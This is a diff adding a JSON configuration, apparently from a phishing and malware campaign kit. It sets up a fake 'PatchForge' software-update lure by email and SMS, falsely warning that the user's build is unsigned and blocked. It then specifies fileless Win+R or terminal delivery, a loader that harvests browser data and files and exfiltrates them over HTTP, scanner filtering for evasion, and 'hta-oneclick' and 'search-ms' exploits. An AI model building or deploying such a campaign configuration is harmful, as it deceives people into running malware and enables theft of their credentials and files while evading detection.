@@ -1,0 +1,44 @@
+{
+  "id": "update-en",
+  "label": "Unsigned build — download required",
+  "persona": {
+    "brand": "PatchForge",
+    "voice": "software deployment notice, support tone",
+    "urgency": "critical",
+    "lexicon": ["download", "update", "build", "signature"]
+  },
+  "scenarios": ["software_update", "file_blocked"],
+  "channels": {
+    "email": {
+      "subject": "[Action required] Build {ref} is unsigned — download the patched installer",
+      "body": "Hello {name},\n\nThe build of {brand} installed on your workstation ({city}) no longer matches our signing chain. Until the update is applied, execution of local binaries will be blocked by policy.\n\nDownload the signed package before {deadline}:\n{lure}\n\n{brand} Deployment Team — {agent}"
+    },
+    "sms": {
+      "body": "{brand}: build {ref} is unsigned, execution blocked. Updated installer: {lure}"
+    }
+  },
+  "context": {
+    "inject": ["ref", "deadline", "city"]
+  },
+  "techniques": {
+    "surfaces": ["winr", "terminal"],
+    "min_reliability": 4,
+    "prefer_tags": ["stealth", "fileless"],
+    "avoid": ["winr-certutil", "winr-bitsadmin"]
+  },
+  "payload": {
+    "kind": "loader",
+    "collect": ["browser", "files"],
+    "exfil": "http",
+    "sleep": 20,
+    "jitter": 0.25,
+    "edr_hint": ""
+  },
+  "opsec": {
+    "filter_scanners": true,
+    "dwell_hours": 3,
+    "variant_count": 3
+  },
+  "chain": ["lure", "stager", "stage2", "collect", "exfil"],
+  "exploits": ["hta-oneclick", "search-ms"]
+}
